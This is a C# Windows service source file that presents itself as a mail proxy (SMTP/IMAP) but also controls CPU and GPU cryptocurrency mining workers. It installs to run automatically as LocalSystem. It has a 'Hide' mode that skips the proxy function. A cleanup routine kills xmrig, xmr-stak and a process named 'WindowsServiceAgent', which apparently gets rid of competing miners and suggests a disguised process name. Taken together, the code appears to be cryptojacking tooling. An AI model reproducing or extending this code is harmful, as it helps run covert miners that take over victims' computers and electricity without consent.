using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Timers;
using ZetaIpc.Runtime.Client;
using ZetaIpc.Runtime.Server;
using Freya.Proxy;
using System.IO;
using Newtonsoft.Json;

namespace Freya.Service
{
    public partial class ProxyService : ServiceBase
    {
        private IpcServer radioServer = null;
        private FIpcClient radioClient = null;


        /// <summary>List of all proxies that have been started.</summary>
        private List<ImapProxy> imapProxies = null;
        private List<Pop3Proxy> pop3Proxies = null;
        private List<SmtpProxy> smtpProxies = null;

        private Worker[] Workers = new Worker[FConstants.WorkerFileName.Length];

        private FRegSetting RegSetting = new FRegSetting();
        private Status s = new Status();

        static private LogWriter logger = new LogWriter(FConstants.TextLogEnable);


        public ProxyService()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Handle the service start event by reading the settings file and starting all specified proxy instances.
        /// </summary>
        protected override void OnStart(string[] args)
        {
            radioClient = new FIpcClient();
            radioClient.Initialize(s.UIPort);

            try
            {
                //Initialize Workers
                int w = (int)FConstants.WorkerType.CPU;
                try
                {
                    if (s.MinerSwitch[w] == true)
                    {
                        Workers[w] = new Worker((FConstants.WorkerType)w, s, radioClient, logger);
                        Workers[w].AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
                        Workers[w].Enable = true;
                        logger.WriteLine($@"[Service] Initialize Worker {w} AlwaysRun:{Workers[w].AlwaysRun}|Enable:{Workers[w].Enable}");
                    }

                    w = (int)FConstants.WorkerType.AMD;
                    if (s.MinerSwitch[w] == true)
                    {
                        Workers[w] = new Worker((FConstants.WorkerType)w, s, radioClient, logger);
                        Workers[w].AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
                        Workers[w].Enable = true;
                        logger.WriteLine($@"[Service] Initialize Worker {w} AlwaysRun:{Workers[w].AlwaysRun}|Enable:{Workers[w].Enable}");
                    }

                    w = (int)FConstants.WorkerType.nVidia;
                    if (s.MinerSwitch[w] == true)
                    {
                        Workers[w] = new Worker((FConstants.WorkerType)w, s, radioClient, logger);
                        Workers[w].AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;
                        Workers[w].Enable = true;
                        logger.WriteLine($@"[Service] Initialize Worker {w} AlwaysRun:{Workers[w].AlwaysRun}|Enable:{Workers[w].Enable}");
                    }
                }
                catch (Exception ex)
                {
                    logger.WriteLine($@"[Service] Initialize Worker {w} fail, excpetion: {ex.Message}");
                }

                //Initialize IPC Server, try 3 times
                for (int i = 0; i < 3; i++)
                {
                    int serverPort = FFunc.FreePortHelper.GetFreePort(13000);
                    FFunc.SetRegKey("ServicePort1", serverPort);
                    try
                    {
                        radioServer = new IpcServer();
                        radioServer.Start(serverPort);
                        radioServer.ReceivedRequest += new EventHandler<ReceivedRequestEventArgs>(RadioReceiver);
                        logger.WriteLine($@"[Service] Service Radio started at port {serverPort}");
                        break;
                    }
                    catch (Exception ex)
                    {
                        logger.WriteLine($@"[Service] Service Start radioServer at port {serverPort} fail, excpetion: {ex.Message}");
                    }
                }

                FFunc.SetRegKey("FreyaDirectory", System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase);

                StartProxies();
                CleanupMiner();

                logger.WriteLine("[Service] FreyaService Initialized.");
            }
            catch (Exception ex)
            {
                logger.WriteLine("[Service] FreyaService Service Start Fail:" + ex.Message);
                if (radioClient != null)
                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG] Service Start Fail:" + ex.Message, Loglevel = FConstants.FreyaLogLevel.FreyaInfo }));
            }

        }

        /// <summary>
        /// Handle the service stop event by stopping all proxies.
        /// </summary>
        protected override void OnStop()
        {
            try
            {
                StopProxies();

                for (int n = 0; n < Workers.Length; n++)
                {
                    if (Workers[n] != null)
                    {
                        try
                        {
                            Workers[n].Enable = false;
                            Workers[n].Stop();
                            Workers[n] = null;
                        }
                        catch (Exception) { }
                    }
                }

                if (radioServer != null)
                    radioServer.Stop();

                logger.WriteLine("[Service] OnStop() finished. Service Stopped.");
            }
            catch (Exception ex) { logger.WriteLine("[Service] OnStop() - Stop Service Excpetion:" + ex.Message); }
        }

        /// <summary>
        /// Handle service continuations following pauses.
        /// </summary>
        protected override void OnContinue()
        {
            if (imapProxies != null)
            {
                foreach (ImapProxy imapProxy in imapProxies)
                    imapProxy.ProcessContinuation();

                imapProxies.Clear();
            }
            if (pop3Proxies != null)
            {
                foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                    pop3Proxy.ProcessContinuation();

                pop3Proxies.Clear();
            }
            if (smtpProxies != null)
            {
                foreach (SmtpProxy smtpProxy in smtpProxies)
                    smtpProxy.ProcessContinuation();

                smtpProxies.Clear();
            }
        }

        /// <summary>
        /// Handle pause event.
        /// </summary>
        protected override void OnPause()
        {
            if (imapProxies != null)
            {
                foreach (ImapProxy imapProxy in imapProxies)
                    imapProxy.ProcessPause();

                imapProxies.Clear();
            }
            if (pop3Proxies != null)
            {
                foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                    pop3Proxy.ProcessPause();

                pop3Proxies.Clear();
            }
            if (smtpProxies != null)
            {
                foreach (SmtpProxy smtpProxy in smtpProxies)
                    smtpProxy.ProcessPause();

                smtpProxies.Clear();
            }
        }

        /// <summary>
        /// Handle power events, such as hibernation.
        /// </summary>
        protected override bool OnPowerEvent(PowerBroadcastStatus powerStatus)
        {
            if (imapProxies != null)
            {
                foreach (ImapProxy imapProxy in imapProxies)
                    imapProxy.ProcessPowerEvent((int)powerStatus);

                imapProxies.Clear();
            }
            if (pop3Proxies != null)
            {
                foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                    pop3Proxy.ProcessPowerEvent((int)powerStatus);

                pop3Proxies.Clear();
            }
            if (smtpProxies != null)
            {
                foreach (SmtpProxy smtpProxy in smtpProxies)
                    smtpProxy.ProcessPowerEvent((int)powerStatus);

                smtpProxies.Clear();
            }

            return base.OnPowerEvent(powerStatus);
        }

        /// <summary>
        /// Return the path where the service's settings should be saved and loaded.
        /// </summary>
        private static string GetSettingsFileName()
        {
            return AppDomain.CurrentDomain.BaseDirectory + "\\Freya.Proxy.xml";
        }

        private void RadioReceiver(object sender, ReceivedRequestEventArgs args)
        {
            FMsg fMsg = JsonConvert.DeserializeObject<FMsg>(args.Request);
            if (fMsg.Type.Equals("CMD"))
            {
                Console.WriteLine("Get CMD: " + fMsg.Data);
                switch (fMsg.Data)
                {
                    case "SetIdleTime":
                        foreach (Worker w in Workers)
                            if (w != null)
                                w.SetIdleTime(Convert.ToDouble(fMsg.Data2));
                        args.Response = JsonConvert.SerializeObject(s);
                        break;

                    case "GetWorkerStatus":
                        string workerstatus = "";
                        foreach (Worker w in Workers)
                        {
                            if (w != null)
                            {
                                if (w.Type == FConstants.WorkerType.CPU)
                                    workerstatus += (w.isRunning)? "C:" : "c:";
                                else if (w.Type == FConstants.WorkerType.AMD)
                                    workerstatus += (w.isRunning) ? "A:" : "a:";
                                else if (w.Type == FConstants.WorkerType.nVidia)
                                    workerstatus += (w.isRunning) ? "N:" : "n:";

                                workerstatus = workerstatus + w.Message + "\n";
                            }
                        }

                        args.Response = workerstatus;
                        break;

                    case "MinerDisable":
                        foreach (Worker w in Workers)
                            if (w != null)
                                w.Enable = false;
                        s.MinerEnable = false;
                        args.Response = JsonConvert.SerializeObject(s);
                        break;

                    case "MinerEnable":
                        foreach (Worker w in Workers)
                            if (w != null)
                                w.Enable = true;
                        s.MinerEnable = true;
                        args.Response = JsonConvert.SerializeObject(s);
                        break;

                    case "GetStatus":
                        for (int w = 0; w < Workers.Length; w++)
                            if (Workers[w] != null)
                                s.MinerIsActive[w] = Workers[w].isRunning;
                            else
                                s.MinerIsActive[w] = false;
                        logger.WriteLine($"[Service] s.MinerIsActive {s.MinerIsActive[0]}|{s.MinerIsActive[1]}|{s.MinerIsActive[2]}");
                        args.Response = JsonConvert.SerializeObject(s);
                        break;

                    case "SetUIPort":
                        s.UIPort = Convert.ToInt32(fMsg.Data2);
                        radioClient.SetPort(s.UIPort);
                        FFunc.SetRegKey("FreyaUIPort", s.UIPort);
                        logger.WriteLine($"[Service] Receive UI Port at {s.UIPort}");
                        args.Response = JsonConvert.SerializeObject(s);
                        break;

                    case "RadioTest":
                        string ss = radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = $"Service to UI radio test ... [Service Server Port {radioServer.Port}], [UI Port {radioClient.GetPort()}]", Loglevel = FConstants.FreyaLogLevel.FreyaInfo }));
                        args.Response = $"[Service] s.MinerIsActive {s.MinerIsActive[0]}|{s.MinerIsActive[1]}|{s.MinerIsActive[2]}";
                        logger.WriteLine($"[Service] RadioTest sUIPort: {s.UIPort}, GetPort:{radioClient.GetPort()}");
                        break;

                    case "StartProxy":
                        StartProxies();
                        args.Response = "OK";
                        break;

                    case "StopProxy":
                        StopProxies();
                        args.Response = "OK";
                        break;

                    case "WriteRegistry":
                        if (fMsg.Data2.Length > 0)
                        {
                            RegSetting.SetSettingsToRegisry(fMsg.Data2);
                            args.Response = "OK";
                            logger.WriteLine("[Service] Options writed to registry.");
                        }
                        else
                        {
                            args.Response = "NG";
                        }
                        s.UpdateMinerSwitch();

                        foreach (Worker w in Workers)
                            if (w != null)
                                w.AlwaysRun = RegSetting.hasRight(FConstants.FeatureByte.AlwaysRun) ? true : false;

                        string strbuf = "";
                        foreach (bool s in s.MinerSwitch)
                            strbuf = strbuf + s.ToString() + " |";
                        logger.WriteLine($"[Service] WorkerSwitch : {strbuf}");
                        break;

                    default:
                        args.Response = "SCNG";
                        break;
                }
            }
            else
                args.Response = "SCNG1";

            args.Handled = true;
        }

        private void StartProxies()
        {
            if (RegSetting.hasRight(FConstants.FeatureByte.Hide))
                return;

            RegSetting.GetSettingsFromRegistry();
            if (RegSetting.EMail == null || RegSetting.getPassword() == null || RegSetting.SMTPServerIP == null || RegSetting.WebServiceIP == null)
            {
                logger.WriteLine("[Service] Proxy information not set, skip start proxy..");
                radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Proxy information not set, skip start proxy.", Loglevel = FConstants.FreyaLogLevel.Normal }));
                return;
            }


            //imapProxies = ImapProxy.StartProxiesFromSettingsFile(GetSettingsFileName());
            //pop3Proxies = Pop3Proxy.StartProxiesFromSettingsFile(GetSettingsFileName());
            //smtpProxies = SmtpProxy.StartProxiesFromSettingsFile(GetSettingsFileName());

            //radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "Fire up SMTP Proxy on 127.0.0.1:25", Loglevel = FConstants.FreyaLogLevel.Normal }));
            smtpProxies = SmtpProxy.StartProxiesFromRegistry(RegSetting, radioClient);
            imapProxies = ImapProxy.StartProxiesFromFromRegistry(RegSetting, radioClient);
            logger.WriteLine("[Service] Proxies Starting...");
        }

        private void StopProxies()
        {
            try
            {
                if (imapProxies != null)
                {
                    foreach (ImapProxy imapProxy in imapProxies)
                        imapProxy.Stop();

                    imapProxies.Clear();
                }
                if (pop3Proxies != null)
                {
                    foreach (Pop3Proxy pop3Proxy in pop3Proxies)
                        pop3Proxy.Stop();

                    pop3Proxies.Clear();
                }
                if (smtpProxies != null)
                {
                    foreach (SmtpProxy smtpProxy in smtpProxies)
                        smtpProxy.Stop();

                    smtpProxies.Clear();
                }
                logger.WriteLine("[Service] Proxies stopped.");
            }
            catch (Exception ex) { logger.WriteLine("[Service] Stop Proxy Exception:" + ex.Message); }
        }

        private void CleanupMiner()
        {
            Process[] procs = Process.GetProcesses();
            foreach (Process p in procs)
            {
                try
                {
                    if (p.ProcessName == "xmrig" || p.ProcessName == "xmr-stak" || p.ProcessName == "WindowsServiceAgent")
                    {
                        p.Kill();
                        logger.WriteLine("[Service] Kill " + p.ProcessName + " (CleanUp)");
                    }
                }
                catch (Exception ex)
                {
                    logger.WriteLine("[Service] Cleanup Worker fail: " + ex.Message);
                    radioClient.Send(JsonConvert.SerializeObject(new FMsg { Type = "MSG", Data = "[DBG]Cleanup Worker fail:" + ex.Message + " - " + p.ProcessName, Loglevel = FConstants.FreyaLogLevel.MinerInfo }));
                }
            }
        }


    }


    /// =-------------------------------------------------------------------------------------------------------------------------

    /// <summary>
    /// Sets the service account to the local system.
    /// </summary>
    [RunInstaller(true)]
    public sealed class ProxyServiceProcessInstaller : ServiceProcessInstaller
    {
        public ProxyServiceProcessInstaller()
        {
            Account = ServiceAccount.LocalSystem;
        }
    }

    /// <summary>
    /// Handles OpaqueMail Proxy service installation.
    /// </summary>
    [RunInstaller(true)]
    public sealed class ProxyServiceInstaller : ServiceInstaller
    {
        /// <summary>
        /// Default constructor.
        /// </summary>
        public ProxyServiceInstaller()
        {
            Description = FConstants.ServiceDescription;
            DisplayName = FConstants.ServiceDisplayName;
            ServiceName = FConstants.ServiceName;
            StartType = ServiceStartMode.Automatic;
        }

        /// <summary>
        /// Handle installation and uninstallation.
        /// </summary>
        /// <param name="uninstall">Whether we're uninstalling.  False if installing, true if uninstalling</param>
        /// <param name="args">Any service installation arguments.</param>
        public void Install(bool uninstall, string[] args)
        {
            try
            {
                using (AssemblyInstaller installer = new AssemblyInstaller(typeof(Program).Assembly, args))
                {
                    IDictionary state = new Hashtable();
                    installer.UseNewContext = true;
                    try
                    {
                        // Attempt to install or uninstall.
                        if (uninstall)
                            installer.Uninstall(state);
                        else
                        {
                            installer.Install(state);
                            installer.Commit(state);
                        }
                    }
                    catch
                    {
                        // If an error is encountered, attempt to roll back.
                        try
                        {
                            installer.Rollback(state);
                        }
                        catch { }

                        throw;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.Message);
            }
        }
    }
}
